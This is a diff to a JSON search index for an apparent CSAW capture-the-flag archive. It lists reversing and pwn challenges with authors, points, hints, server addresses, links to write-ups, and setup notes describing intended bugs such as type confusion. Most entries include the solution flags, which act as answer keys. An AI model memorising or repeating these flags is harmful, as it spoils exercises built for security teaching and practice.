@@ -496,6 +496,146 @@
             "title": "Solution"
         }, 
         {
+            "location": "/challenges/2015/reversing/HackingTime/", 
+            "text": "Hacking Time\n\n\nAuthor\n\n\nWagner\n\n\nPoints\n\n\n200\n\n\nCategory\n\n\nReversing\n\n\nDescription\n\n\nWe're getting a transmission from someone in the past, find out what he wants.\n\n\nFlag\n\n\nNOHACK4UXWRATHOFKFUHRERX\n\n\nSolution\n\n\nSetup", 
+            "title": "Hacking Time"
+        }, 
+        {
+            "location": "/challenges/2015/reversing/HackingTime/#hacking-time", 
+            "text": "", 
+            "title": "Hacking Time"
+        }, 
+        {
+            "location": "/challenges/2015/reversing/HackingTime/#author", 
+            "text": "Wagner", 
+            "title": "Author"
+        }, 
+        {
+            "location": "/challenges/2015/reversing/HackingTime/#points", 
+            "text": "200", 
+            "title": "Points"
+        }, 
+        {
+            "location": "/challenges/2015/reversing/HackingTime/#category", 
+            "text": "Reversing", 
+            "title": "Category"
+        }, 
+        {
+            "location": "/challenges/2015/reversing/HackingTime/#description", 
+            "text": "We're getting a transmission from someone in the past, find out what he wants.", 
+            "title": "Description"
+        }, 
+        {
+            "location": "/challenges/2015/reversing/HackingTime/#flag", 
+            "text": "NOHACK4UXWRATHOFKFUHRERX", 
+            "title": "Flag"
+        }, 
+        {
+            "location": "/challenges/2015/reversing/HackingTime/#solution", 
+            "text": "", 
+            "title": "Solution"
+        }, 
+        {
+            "location": "/challenges/2015/reversing/HackingTime/#setup", 
+            "text": "", 
+            "title": "Setup"
+        }, 
+        {
+            "location": "/challenges/2015/reversing/ftp/", 
+            "text": "FTP\n\n\nAuthor\n\n\nBohen\n\n\nPoints\n\n\n300\n\n\nCategory\n\n\nReversing\n\n\nDescription\n\n\nWe found an ftp service, I'm sure there's some way to log on to it.\n\n\nFlag\n\n\nflag{n0_c0ok1e_ju$t_a_f1ag_f0r_you}\n\n\nSolution\n\n\nSetup", 
+            "title": "FTP"
+        }, 
+        {
+            "location": "/challenges/2015/reversing/ftp/#ftp", 
+            "text": "", 
+            "title": "FTP"
+        }, 
+        {
+            "location": "/challenges/2015/reversing/ftp/#author", 
+            "text": "Bohen", 
+            "title": "Author"
+        }, 
+        {
+            "location": "/challenges/2015/reversing/ftp/#points", 
+            "text": "300", 
+            "title": "Points"
+        }, 
+        {
+            "location": "/challenges/2015/reversing/ftp/#category", 
+            "text": "Reversing", 
+            "title": "Category"
+        }, 
+        {
+            "location": "/challenges/2015/reversing/ftp/#description", 
+            "text": "We found an ftp service, I'm sure there's some way to log on to it.", 
+            "title": "Description"
+        }, 
+        {
+            "location": "/challenges/2015/reversing/ftp/#flag", 
+            "text": "flag{n0_c0ok1e_ju$t_a_f1ag_f0r_you}", 
+            "title": "Flag"
+        }, 
+        {
+            "location": "/challenges/2015/reversing/ftp/#solution", 
+            "text": "", 
+            "title": "Solution"
+        }, 
+        {
+            "location": "/challenges/2015/reversing/ftp/#setup", 
+            "text": "", 
+            "title": "Setup"
+        }, 
+        {
+            "location": "/challenges/2014/reversing/csaw2013reversing2/", 
+            "text": "CSAW 2013 Reversing 2\n\n\nAuthor\n\n\nCohen\n\n\nPoints\n\n\n200\n\n\nCategory\n\n\nReversing\n\n\nDescription\n\n\nWe got a little lazy so we just tweaked an old one a bit\n\n\nFlag\n\n\nflag{reversing_is_not_that_hard!}\n\n\nSolution\n\n\nSetup\n\n\nNotes\n\n\nThis challenge is named csaw2013reversing2.exe as a hint. It's very similiar to the second challenge from last year, where you have to run the program down a path that's going to print out the key and you still have to read the key out of memory because of a bug.\nMD5: 3d47ddf04cc6a8120c400a5f304e3ed6", 
+            "title": "CSAW Reversing 2"
+        }, 
+        {
+            "location": "/challenges/2014/reversing/csaw2013reversing2/#csaw-2013-reversing-2", 
+            "text": "", 
+            "title": "CSAW 2013 Reversing 2"
+        }, 
+        {
+            "location": "/challenges/2014/reversing/csaw2013reversing2/#author", 
+            "text": "Cohen", 
+            "title": "Author"
+        }, 
+        {
+            "location": "/challenges/2014/reversing/csaw2013reversing2/#points", 
+            "text": "200", 
+            "title": "Points"
+        }, 
+        {
+            "location": "/challenges/2014/reversing/csaw2013reversing2/#category", 
+            "text": "Reversing", 
+            "title": "Category"
+        }, 
+        {
+            "location": "/challenges/2014/reversing/csaw2013reversing2/#description", 
+            "text": "We got a little lazy so we just tweaked an old one a bit", 
+            "title": "Description"
+        }, 
+        {
+            "location": "/challenges/2014/reversing/csaw2013reversing2/#flag", 
+            "text": "flag{reversing_is_not_that_hard!}", 
+            "title": "Flag"
+        }, 
+        {
+            "location": "/challenges/2014/reversing/csaw2013reversing2/#solution", 
+            "text": "", 
+            "title": "Solution"
+        }, 
+        {
+            "location": "/challenges/2014/reversing/csaw2013reversing2/#setup", 
+            "text": "", 
+            "title": "Setup"
+        }, 
+        {
+            "location": "/challenges/2014/reversing/csaw2013reversing2/#notes", 
+            "text": "This challenge is named csaw2013reversing2.exe as a hint. It's very similiar to the second challenge from last year, where you have to run the program down a path that's going to print out the key and you still have to read the key out of memory because of a bug.\nMD5: 3d47ddf04cc6a8120c400a5f304e3ed6", 
+            "title": "Notes"
+        }, 
+        {
             "location": "/challenges/2017/reversing/bananascript/", 
             "text": "BananaScript\n\n\nAuthor\n\n\nKyle Martin\n\n\nPoints\n\n\n450\n\n\nCategory\n\n\nReversing\n\n\nDescription\n\n\nNot too sure how to Interpret this, the lab member who wrote this \"forgot\" to write any documentation.  This shit, and him, is bananas. B, A-N-A-N-A-S.\n\n\nFlag\n\n\nflag{0r4ng3_3w3_ch1pp3r_1_h47h_n07_s4y_b4n4n4rs}\n\n\nSolution\n\n\nsolve.py\n\n\nSetup\n\n\nRelease \nmonkeyDo\n (the interpreter) and \nbanana.script\n (the program it interprets)\nRelease one more example script every now and then when nobody has solved", 
             "title": "Bananascript"
@@ -951,13 +1091,238 @@
             "title": "Solution"
         }, 
         {
+            "location": "/challenges/2015/reversing/return-of-the-wieners/", 
+            "text": "Return of the Wieners\n\n\nAuthor\n\n\nAntoniewicz\n\n\nPoints\n\n\n300\n\n\nCategory\n\n\nReversing\n\n\nDescription\n\n\nWieners was too hard last year so now it's been made easier.\nNote: The format for this challenge is key{}.\n\n\nFlag\n\n\nkey{imgur.com/DsQl4by}\n\n\nSolution\n\n\nSetup\n\n\nreturn_of_the_wieners_fdcfa9d04156803d4976693abe21aac1", 
+            "title": "Return of the Wieners"
+        }, 
+        {
+            "location": "/challenges/2015/reversing/return-of-the-wieners/#return-of-the-wieners", 
+            "text": "", 
+            "title": "Return of the Wieners"
+        }, 
+        {
+            "location": "/challenges/2015/reversing/return-of-the-wieners/#author", 
+            "text": "Antoniewicz", 
+            "title": "Author"
+        }, 
+        {
+            "location": "/challenges/2015/reversing/return-of-the-wieners/#points", 
+            "text": "300", 
+            "title": "Points"
+        }, 
+        {
+            "location": "/challenges/2015/reversing/return-of-the-wieners/#category", 
+            "text": "Reversing", 
+            "title": "Category"
+        }, 
+        {
+            "location": "/challenges/2015/reversing/return-of-the-wieners/#description", 
+            "text": "Wieners was too hard last year so now it's been made easier.\nNote: The format for this challenge is key{}.", 
+            "title": "Description"
+        }, 
+        {
+            "location": "/challenges/2015/reversing/return-of-the-wieners/#flag", 
+            "text": "key{imgur.com/DsQl4by}", 
+            "title": "Flag"
+        }, 
+        {
+            "location": "/challenges/2015/reversing/return-of-the-wieners/#solution", 
+            "text": "", 
+            "title": "Solution"
+        }, 
+        {
+            "location": "/challenges/2015/reversing/return-of-the-wieners/#setup", 
+            "text": "return_of_the_wieners_fdcfa9d04156803d4976693abe21aac1", 
+            "title": "Setup"
+        }, 
+        {
+            "location": "/challenges/2015/reversing/cookie-maze/", 
+            "text": "cookie_maze\n\n\nAuthor\n\n\nBohan\n\n\nCategory\n\n\nReversing\n\n\nPoints\n\n\n400\n\n\nDescription\n\n\nEver feel like a rat trapped in a maze? There's a flag somewhere in this binary but I just can't seem to find it.\nIf you don't have a OS X box you can ssh here after requesting it.\nssh 0.tcp.ngrok.io -p 47136\n~Update new port is 47136\nHints:\n- \nhttps://www.mikeash.com/pyblog/friday-qa-2013-01-11-mach-exception-handlers.html\n\n- \nhttps://github.com/gdbinit/readmem\n\n- If an exception handler returns success(0) the binary continues executing even if the exception was not handled if it returns failure(5) it always exits\n\n\nFlag\n\n\nflag{Qi29a85i52aA5i5Ea15i81aM5i5Qa18i51aY5}\n\n\nSolution\n\n\nSetup\n\n\nDistribute \ncookie_maze_8d8023f8f7c38181e8abd9c5c70d527b", 
+            "title": "Cookie Maze"
+        }, 
+        {
+            "location": "/challenges/2015/reversing/cookie-maze/#cookie_maze", 
+            "text": "", 
+            "title": "cookie_maze"
+        }, 
+        {
+            "location": "/challenges/2015/reversing/cookie-maze/#author", 
+            "text": "Bohan", 
+            "title": "Author"
+        }, 
+        {
+            "location": "/challenges/2015/reversing/cookie-maze/#category", 
+            "text": "Reversing", 
+            "title": "Category"
+        }, 
+        {
+            "location": "/challenges/2015/reversing/cookie-maze/#points", 
+            "text": "400", 
+            "title": "Points"
+        }, 
+        {
+            "location": "/challenges/2015/reversing/cookie-maze/#description", 
+            "text": "Ever feel like a rat trapped in a maze? There's a flag somewhere in this binary but I just can't seem to find it.\nIf you don't have a OS X box you can ssh here after requesting it.\nssh 0.tcp.ngrok.io -p 47136\n~Update new port is 47136\nHints:\n-  https://www.mikeash.com/pyblog/friday-qa-2013-01-11-mach-exception-handlers.html \n-  https://github.com/gdbinit/readmem \n- If an exception handler returns success(0) the binary continues executing even if the exception was not handled if it returns failure(5) it always exits", 
+            "title": "Description"
+        }, 
+        {
+            "location": "/challenges/2015/reversing/cookie-maze/#flag", 
+            "text": "flag{Qi29a85i52aA5i5Ea15i81aM5i5Qa18i51aY5}", 
+            "title": "Flag"
+        }, 
+        {
+            "location": "/challenges/2015/reversing/cookie-maze/#solution", 
+            "text": "", 
+            "title": "Solution"
+        }, 
+        {
+            "location": "/challenges/2015/reversing/cookie-maze/#setup", 
+            "text": "Distribute  cookie_maze_8d8023f8f7c38181e8abd9c5c70d527b", 
+            "title": "Setup"
+        }, 
+        {
+            "location": "/challenges/2015/reversing/pwning-a-locked-container-plc/", 
+            "text": "Pwning a Locked Container (P.L.C)\n\n\nAuthor\n\n\nDHS\n\n\nPoints\n\n\n400\n\n\nCategory\n\n\nReversing\n\n\nDescription\n\n\nPLC challenge round 2.\n\n\nFlag\n\n\nSolution\n\n\nSetup", 
+            "title": "Pwning a Locked Container"
+        }, 
+        {
+            "location": "/challenges/2015/reversing/pwning-a-locked-container-plc/#pwning-a-locked-container-plc", 
+            "text": "", 
+            "title": "Pwning a Locked Container (P.L.C)"
+        }, 
+        {
+            "location": "/challenges/2015/reversing/pwning-a-locked-container-plc/#author", 
+            "text": "DHS", 
+            "title": "Author"
+        }, 
+        {
+            "location": "/challenges/2015/reversing/pwning-a-locked-container-plc/#points", 
+            "text": "400", 
+            "title": "Points"
+        }, 
+        {
+            "location": "/challenges/2015/reversing/pwning-a-locked-container-plc/#category", 
+            "text": "Reversing", 
+            "title": "Category"
+        }, 
+        {
+            "location": "/challenges/2015/reversing/pwning-a-locked-container-plc/#description", 
+            "text": "PLC challenge round 2.", 
+            "title": "Description"
+        }, 
+        {
+            "location": "/challenges/2015/reversing/pwning-a-locked-container-plc/#flag", 
+            "text": "", 
+            "title": "Flag"
+        }, 
+        {
+            "location": "/challenges/2015/reversing/pwning-a-locked-container-plc/#solution", 
+            "text": "", 
+            "title": "Solution"
+        }, 
+        {
+            "location": "/challenges/2015/reversing/pwning-a-locked-container-plc/#setup", 
+            "text": "", 
+            "title": "Setup"
+        }, 
+        {
+            "location": "/challenges/2015/reversing/wyvern/", 
+            "text": "Wyvern\n\n\nAuthor\n\n\nD'antoine?\n\n\nPoints\n\n\n500\n\n\nCategory\n\n\nReversing\n\n\nDescription\n\n\nThere's a dragon afoot, we need a hero. Give us the dragon's secret and we'll give you a flag.\nHINT: static is only 1 of 2 methods to RE. IDA torrent unnecessary\n\n\nFlag\n\n\ndr4g0n_or_p4tric1an_it5_LLVM\n\n\nSolution\n\n\nSetup", 
+            "title": "Wveryn"
+        }, 
+        {
+            "location": "/challenges/2015/reversing/wyvern/#wyvern", 
+            "text": "", 
+            "title": "Wyvern"
+        }, 
+        {
+            "location": "/challenges/2015/reversing/wyvern/#author", 
+            "text": "D'antoine?", 
+            "title": "Author"
+        }, 
+        {
+            "location": "/challenges/2015/reversing/wyvern/#points", 
+            "text": "500", 
+            "title": "Points"
+        }, 
+        {
+            "location": "/challenges/2015/reversing/wyvern/#category", 
+            "text": "Reversing", 
+            "title": "Category"
+        }, 
+        {
+            "location": "/challenges/2015/reversing/wyvern/#description", 
+            "text": "There's a dragon afoot, we need a hero. Give us the dragon's secret and we'll give you a flag.\nHINT: static is only 1 of 2 methods to RE. IDA torrent unnecessary", 
+            "title": "Description"
+        }, 
+        {
+            "location": "/challenges/2015/reversing/wyvern/#flag", 
+            "text": "dr4g0n_or_p4tric1an_it5_LLVM", 
+            "title": "Flag"
+        }, 
+        {
+            "location": "/challenges/2015/reversing/wyvern/#solution", 
+            "text": "", 
+            "title": "Solution"
+        }, 
+        {
+            "location": "/challenges/2015/reversing/wyvern/#setup", 
+            "text": "", 
+            "title": "Setup"
+        }, 
+        {
+            "location": "/challenges/2015/reversing/wyvern2/", 
+            "text": "wyvern2\n\n\nAuthor\n\n\nD'Antoine\n\n\nPoints\n\n\n500\n\n\nCategory\n\n\nReversing\n\n\nDescription\n\n\nThe dragon has returned! This time stronger....\nBrute strength has failed and now only magic can save us. Use your skills to defeat the dragon and win the princess.\n\n\nFlag\n\n\nflag{Sm0k_lub_p4trycju5z_j3st_LLVM2.o}\n\n\nSolution\n\n\nSetup\n\n\nwyvern2_9ea71d6a870c4f4e8f8e1859a0f628eb", 
+            "title": "Wveryn 2"
+        }, 
+        {
+            "location": "/challenges/2015/reversing/wyvern2/#wyvern2", 
+            "text": "", 
+            "title": "wyvern2"
+        }, 
+        {
+            "location": "/challenges/2015/reversing/wyvern2/#author", 
+            "text": "D'Antoine", 
+            "title": "Author"
+        }, 
+        {
+            "location": "/challenges/2015/reversing/wyvern2/#points", 
+            "text": "500", 
+            "title": "Points"
+        }, 
+        {
+            "location": "/challenges/2015/reversing/wyvern2/#category", 
+            "text": "Reversing", 
+            "title": "Category"
+        }, 
+        {
+            "location": "/challenges/2015/reversing/wyvern2/#description", 
+            "text": "The dragon has returned! This time stronger....\nBrute strength has failed and now only magic can save us. Use your skills to defeat the dragon and win the princess.", 
+            "title": "Description"
+        }, 
+        {
+            "location": "/challenges/2015/reversing/wyvern2/#flag", 
+            "text": "flag{Sm0k_lub_p4trycju5z_j3st_LLVM2.o}", 
+            "title": "Flag"
+        }, 
+        {
+            "location": "/challenges/2015/reversing/wyvern2/#solution", 
+            "text": "", 
+            "title": "Solution"
+        }, 
+        {
+            "location": "/challenges/2015/reversing/wyvern2/#setup", 
+            "text": "wyvern2_9ea71d6a870c4f4e8f8e1859a0f628eb", 
+            "title": "Setup"
+        }, 
+        {
             "location": "/binary-exploitation/introduction/", 
-            "text": "Binary Exploitation", 
+            "text": "Binary Exploitation\n\n\n\n\nBuffer\n\n\nStack\n\n\nHeap\n\n\nBuffer Overflow\n\n\nNo eXecute / Data Execution Prevention\n\n\nAddress Space Layout Randomization\n\n\nReturn to Lib C\n\n\nHeap Overflow\n\n\nFormat String Attacks", 
             "title": "Introduction"
         }, 
         {
             "location": "/binary-exploitation/introduction/#binary-exploitation", 
-            "text": "", 
+            "text": "Buffer  Stack  Heap  Buffer Overflow  No eXecute / Data Execution Prevention  Address Space Layout Randomization  Return to Lib C  Heap Overflow  Format String Attacks", 
             "title": "Binary Exploitation"
         }, 
         {
@@ -1221,6 +1586,51 @@
             "title": "Solution"
         }, 
         {
+            "location": "/challenges/2015/pwn/precision/", 
+            "text": "Precision\n\n\nAuthor\n\n\nLiang\n\n\nPoints\n\n\n100\n\n\nCategory\n\n\nPwn\n\n\nDescription\n\n\nFlag\n\n\nflag{1_533_y0u_kn0w_y0ur_w4y_4r0und_4_buff3r}\n\n\nSolution\n\n\nSetup", 
+            "title": "Precision"
+        }, 
+        {
+            "location": "/challenges/2015/pwn/precision/#precision", 
+            "text": "", 
+            "title": "Precision"
+        }, 
+        {
+            "location": "/challenges/2015/pwn/precision/#author", 
+            "text": "Liang", 
+            "title": "Author"
+        }, 
+        {
+            "location": "/challenges/2015/pwn/precision/#points", 
+            "text": "100", 
+            "title": "Points"
+        }, 
+        {
+            "location": "/challenges/2015/pwn/precision/#category", 
+            "text": "Pwn", 
+            "title": "Category"
+        }, 
+        {
+            "location": "/challenges/2015/pwn/precision/#description", 
+            "text": "", 
+            "title": "Description"
+        }, 
+        {
+            "location": "/challenges/2015/pwn/precision/#flag", 
+            "text": "flag{1_533_y0u_kn0w_y0ur_w4y_4r0und_4_buff3r}", 
+            "title": "Flag"
+        }, 
+        {
+            "location": "/challenges/2015/pwn/precision/#solution", 
+            "text": "", 
+            "title": "Solution"
+        }, 
+        {
+            "location": "/challenges/2015/pwn/precision/#setup", 
+            "text": "", 
+            "title": "Setup"
+        }, 
+        {
             "location": "/challenges/2017/pwn/auir/", 
             "text": "AUIR\n\n\nAuthor\n\n\nPoints\n\n\n200\n\n\nDescription\n\n\nAt long last, we stand at the threshold of destiny. For today, we will restore the glory of our legacy. Today, we will retake what we have lost and reclaim our homeworld. -Artanis-\n\n\nFlag\n\n\nflag{W4rr10rs!_A1ur_4wa1ts_y0u!_M4rch_f0rth_and_t4k3_1t!}\n\n\nSolution\n\n\nauir.py\n\n\nSetup\n\n\n1.\nsudo docker build -t \nauir\n [Path to Dockerfile]\n\n2.\nsudo docker run --name \nauir\n -d -p [PORT]:[PORT] [IMAGE]\n\n\nNote\n\n\n\n\nThe binary is pre-compiled because of ollvm....\n\n\nIt is compiled on Ubuntu 16.04 xenial \n\n\nLibc: libc-2.23.so\n\n\nProbably do not have to give out libc....", 
             "title": "Auir"
@@ -1344,6 +1754,141 @@
             "location": "/challenges/2016/pwn/Tutorial/#solution", 
             "text": "See  tutorial.py", 
             "title": "Solution"
+        }, 
+        {
+            "location": "/challenges/2015/pwn/hipster/", 
+            "text": "Hipster Hitler\n\n\nAuthor\n\n\nTaylor\n\n\nPoints\n\n\n250\n\n\nCategory\n\n\nPwn\n\n\nDescription\n\n\nHipster Hitler's got our flag! Help us retrieve it!\nnc 54.164.94.180 1939\n\n\nFlag\n\n\nSolution\n\n\n\n\nhttps://github.com/aweinstock314/aweinstock-ctf-writeups/blob/master/csaw_finals_2015/exploitation250_hipster/exploitation250_hipster_exploit.py\n\n\n\n\nSetup\n\n\nhipster_0ddd47929dca935698b0bb1463d8ae52", 
+            "title": "Hipster Hitler"
+        }, 
+        {
+            "location": "/challenges/2015/pwn/hipster/#hipster-hitler", 
+            "text": "", 
+            "title": "Hipster Hitler"
+        }, 
+        {
+            "location": "/challenges/2015/pwn/hipster/#author", 
+            "text": "Taylor", 
+            "title": "Author"
+        }, 
+        {
+            "location": "/challenges/2015/pwn/hipster/#points", 
+            "text": "250", 
+            "title": "Points"
+        }, 
+        {
+            "location": "/challenges/2015/pwn/hipster/#category", 
+            "text": "Pwn", 
+            "title": "Category"
+        }, 
+        {
+            "location": "/challenges/2015/pwn/hipster/#description", 
+            "text": "Hipster Hitler's got our flag! Help us retrieve it!\nnc 54.164.94.180 1939", 
+            "title": "Description"
+        }, 
+        {
+            "location": "/challenges/2015/pwn/hipster/#flag", 
+            "text": "", 
+            "title": "Flag"
+        }, 
+        {
+            "location": "/challenges/2015/pwn/hipster/#solution", 
+            "text": "https://github.com/aweinstock314/aweinstock-ctf-writeups/blob/master/csaw_finals_2015/exploitation250_hipster/exploitation250_hipster_exploit.py", 
+            "title": "Solution"
+        }, 
+        {
+            "location": "/challenges/2015/pwn/hipster/#setup", 
+            "text": "hipster_0ddd47929dca935698b0bb1463d8ae52", 
+            "title": "Setup"
+        }, 
+        {
+            "location": "/challenges/2015/pwn/contacts/", 
+            "text": "Title\n\n\nAuthor\n\n\nLiang\n\n\nPoints\n\n\n250\n\n\nCategory\n\n\nPwn\n\n\nDescription\n\n\nFlag\n\n\nflag{f0rm47_s7r1ng5_4r3_fun_57uff}\n\n\nSolution\n\n\nSetup", 
+            "title": "Contacts"
+        }, 
+        {
+            "location": "/challenges/2015/pwn/contacts/#title", 
+            "text": "", 
+            "title": "Title"
+        }, 
+        {
+            "location": "/challenges/2015/pwn/contacts/#author", 
+            "text": "Liang", 
+            "title": "Author"
+        }, 
+        {
+            "location": "/challenges/2015/pwn/contacts/#points", 
+            "text": "250", 
+            "title": "Points"
+        }, 
+        {
+            "location": "/challenges/2015/pwn/contacts/#category", 
+            "text": "Pwn", 
+            "title": "Category"
+        }, 
+        {
+            "location": "/challenges/2015/pwn/contacts/#description", 
+            "text": "", 
+            "title": "Description"
+        }, 
+        {
+            "location": "/challenges/2015/pwn/contacts/#flag", 
+            "text": "flag{f0rm47_s7r1ng5_4r3_fun_57uff}", 
+            "title": "Flag"
+        }, 
+        {
+            "location": "/challenges/2015/pwn/contacts/#solution", 
+            "text": "", 
+            "title": "Solution"
+        }, 
+        {
+            "location": "/challenges/2015/pwn/contacts/#setup", 
+            "text": "", 
+            "title": "Setup"
+        }, 
+        {
+            "location": "/challenges/2015/pwn/autobots/", 
+            "text": "Autonots\n\n\nAuthor\n\n\nChung\n\n\nPoints\n\n\n350\n\n\nCategory\n\n\nPwn\n\n\nDescription\n\n\nI hear bots are playing ctfs now.\n\n\nFlag\n\n\nflag{c4nt_w4it_f0r_cgc_7h15_y34r}\n\n\nSolution\n\n\nSetup", 
+            "title": "Autobots"
+        }, 
+        {
+            "location": "/challenges/2015/pwn/autobots/#autonots", 
+            "text": "", 
+            "title": "Autonots"
+        }, 
+        {
+            "location": "/challenges/2015/pwn/autobots/#author", 
+            "text": "Chung", 
+            "title": "Author"
+        }, 
+        {
+            "location": "/challenges/2015/pwn/autobots/#points", 
+            "text": "350", 
+            "title": "Points"
+        }, 
+        {
+            "location": "/challenges/2015/pwn/autobots/#category", 
+            "text": "Pwn", 
+            "title": "Category"
+        }, 
+        {
+            "location": "/challenges/2015/pwn/autobots/#description", 
+            "text": "I hear bots are playing ctfs now.", 
+            "title": "Description"
+        }, 
+        {
+            "location": "/challenges/2015/pwn/autobots/#flag", 
+            "text": "flag{c4nt_w4it_f0r_cgc_7h15_y34r}", 
+            "title": "Flag"
+        }, 
+        {
+            "location": "/challenges/2015/pwn/autobots/#solution", 
+            "text": "", 
+            "title": "Solution"
+        }, 
+        {
+            "location": "/challenges/2015/pwn/autobots/#setup", 
+            "text": "", 
+            "title": "Setup"
         }, 
         {
             "location": "/challenges/2017/pwn/KWS2/", 
@@ -1896,6 +2441,501 @@
             "title": "Solution"
         }, 
         {
+            "location": "/challenges/2015/pwn/stringipc/", 
+            "text": "StringIPC\n\n\nAuthor\n\n\nCoppola\n\n\nPoints\n\n\n500\n\n\nCategory\n\n\nPwn\n\n\nDescription\n\n\nI've always wanted to try writing a kernel module. I think I covered all my bases but I'm not sure.\nIf your VM hangs, here is an IP to reboot your VM \nhttp://104.236.83.127/reboot\n\nPost Event Update\nStringIPC_Updated contains the exact source of the module running on the VM\n\n\nFlag\n\n\nSolution\n\n\n\n\nhttp://itszn.com/blog/?p=21\n\n\n\n\nSetup\n\n\nStringIPC_427a532edb436a38d1e652bbc5732aa4.tgz\n\n\nStringIPC_Updated_3d38ffc5ca8932e5b60bde85df983ca7.tar.gz", 
+            "title": "StringIPC"
+        }, 
+        {
+            "location": "/challenges/2015/pwn/stringipc/#stringipc", 
+            "text": "", 
+            "title": "StringIPC"
+        }, 
+        {
+            "location": "/challenges/2015/pwn/stringipc/#author", 
+            "text": "Coppola", 
+            "title": "Author"
+        }, 
+        {
+            "location": "/challenges/2015/pwn/stringipc/#points", 
+            "text": "500", 
+            "title": "Points"
+        }, 
+        {
+            "location": "/challenges/2015/pwn/stringipc/#category", 
+            "text": "Pwn", 
+            "title": "Category"
+        }, 
+        {
+            "location": "/challenges/2015/pwn/stringipc/#description", 
+            "text": "I've always wanted to try writing a kernel module. I think I covered all my bases but I'm not sure.\nIf your VM hangs, here is an IP to reboot your VM  http://104.236.83.127/reboot \nPost Event Update\nStringIPC_Updated contains the exact source of the module running on the VM", 
+            "title": "Description"
+        }, 
+        {
+            "location": "/challenges/2015/pwn/stringipc/#flag", 
+            "text": "", 
+            "title": "Flag"
+        }, 
+        {
+            "location": "/challenges/2015/pwn/stringipc/#solution", 
+            "text": "http://itszn.com/blog/?p=21", 
+            "title": "Solution"
+        }, 
+        {
+            "location": "/challenges/2015/pwn/stringipc/#setup", 
+            "text": "StringIPC_427a532edb436a38d1e652bbc5732aa4.tgz  StringIPC_Updated_3d38ffc5ca8932e5b60bde85df983ca7.tar.gz", 
+            "title": "Setup"
+        }, 
+        {
+            "location": "/challenges/2015/pwn/boombox/", 
+            "text": "boombox\n\n\nAuthor\n\n\nGaasedelen\n\n\nPoints\n\n\n500\n\n\nCategory\n\n\nPwn\n\n\nDescription\n\n\n'The latest and greatest bumpin' new streaming service has just hit the web, have you seen it?\nAppJailLauncher.exe /network /key:key /port:4444 /timeout:120 ./boombox.exe'\nPassword: CSAW2015\nUPDATE: The challenge is hosted on \nhttp://40.117.40.124:4444/\n\n\nFlag\n\n\nSolution\n\n\n\n\nhttps://github.com/aweinstock314/aweinstock-ctf-writeups/blob/master/csaw_finals_2015/exploitation500_boombox/boombox_writeup.md\n\n\n\n\nSetup\n\n\nboombox.7z", 
+            "title": "Boombox"
+        }, 
+        {
+            "location": "/challenges/2015/pwn/boombox/#boombox", 
+            "text": "", 
+            "title": "boombox"
+        }, 
+        {
+            "location": "/challenges/2015/pwn/boombox/#author", 
+            "text": "Gaasedelen", 
+            "title": "Author"
+        }, 
+        {
+            "location": "/challenges/2015/pwn/boombox/#points", 
+            "text": "500", 
+            "title": "Points"
+        }, 
+        {
+            "location": "/challenges/2015/pwn/boombox/#category", 
+            "text": "Pwn", 
+            "title": "Category"
+        }, 
+        {
+            "location": "/challenges/2015/pwn/boombox/#description", 
+            "text": "'The latest and greatest bumpin' new streaming service has just hit the web, have you seen it?\nAppJailLauncher.exe /network /key:key /port:4444 /timeout:120 ./boombox.exe'\nPassword: CSAW2015\nUPDATE: The challenge is hosted on  http://40.117.40.124:4444/", 
+            "title": "Description"
+        }, 
+        {
+            "location": "/challenges/2015/pwn/boombox/#flag", 
+            "text": "", 
+            "title": "Flag"
+        }, 
+        {
+            "location": "/challenges/2015/pwn/boombox/#solution", 
+            "text": "https://github.com/aweinstock314/aweinstock-ctf-writeups/blob/master/csaw_finals_2015/exploitation500_boombox/boombox_writeup.md", 
+            "title": "Solution"
+        }, 
+        {
+            "location": "/challenges/2015/pwn/boombox/#setup", 
+            "text": "boombox.7z", 
+            "title": "Setup"
+        }, 
+        {
+            "location": "/challenges/2015/pwn/meme-shop/", 
+            "text": "Meme Shop\n\n\nAuthor\n\n\nCrowell\n\n\nPoints\n\n\n400\n\n\nCategory\n\n\nPwn\n\n\nDescription\n\n\nonly dwn knows what the meme is!\npwn this service to find out what only he knows!\ndwn: please tell us the meme....\n\n\nFlag\n\n\nflag{dwn: please tell us your meme. I'm not going to stop asking}\n\n\nSolution\n\n\nSetup\n\n\nthis is a simple type confusion challenge\nyou have types \"meme\" and \"mrskeletal\"\nthe counter is an int8_t so you can overflow and f it up\nfirst you need ruby\nthen you need colorize\n\ngem install colorize\n\nthen you need to build the extension\n\n\nruby ./extconf.rb\nmake\n\n\n\n\n\nthen run the challenge with \nsocat\n or w/e\nmake sure that the flag is called \"flag\" because there is arb file read\nalso delete the .c file and do not provide the debug edition of the rb file", 
+            "title": "Meme Shop"
+        }, 
+        {
+            "location": "/challenges/2015/pwn/meme-shop/#meme-shop", 
+            "text": "", 
+            "title": "Meme Shop"
+        }, 
+        {
+            "location": "/challenges/2015/pwn/meme-shop/#author", 
+            "text": "Crowell", 
+            "title": "Author"
+        }, 
+        {
+            "location": "/challenges/2015/pwn/meme-shop/#points", 
+            "text": "400", 
+            "title": "Points"
+        }, 
+        {
+            "location": "/challenges/2015/pwn/meme-shop/#category", 
+            "text": "Pwn", 
+            "title": "Category"
+        }, 
+        {
+            "location": "/challenges/2015/pwn/meme-shop/#description", 
+            "text": "only dwn knows what the meme is!\npwn this service to find out what only he knows!\ndwn: please tell us the meme....", 
+            "title": "Description"
+        }, 
+        {
+            "location": "/challenges/2015/pwn/meme-shop/#flag", 
+            "text": "flag{dwn: please tell us your meme. I'm not going to stop asking}", 
+            "title": "Flag"
+        }, 
+        {
+            "location": "/challenges/2015/pwn/meme-shop/#solution", 
+            "text": "", 
+            "title": "Solution"
+        }, 
+        {
+            "location": "/challenges/2015/pwn/meme-shop/#setup", 
+            "text": "this is a simple type confusion challenge\nyou have types \"meme\" and \"mrskeletal\"\nthe counter is an int8_t so you can overflow and f it up\nfirst you need ruby\nthen you need colorize gem install colorize \nthen you need to build the extension  ruby ./extconf.rb\nmake  then run the challenge with  socat  or w/e\nmake sure that the flag is called \"flag\" because there is arb file read\nalso delete the .c file and do not provide the debug edition of the rb file", 
+            "title": "Setup"
+        }, 
+        {
+            "location": "/challenges/2015/pwn/rhinoxorus/", 
+            "text": "Rhinoxorus\n\n\nAuthor\n\n\nEdwards\n\n\nPoints\n\n\n500\n\n\nCategory\n\n\nPwn\n\n\nDescription\n\n\nFlag\n\n\ncc21fe41b44ba70d0e6978c840698601\n\n\nSolution\n\n\nSetup", 
+            "title": "Rhinoxorus"
+        }, 
+        {
+            "location": "/challenges/2015/pwn/rhinoxorus/#rhinoxorus", 
+            "text": "", 
+            "title": "Rhinoxorus"
+        }, 
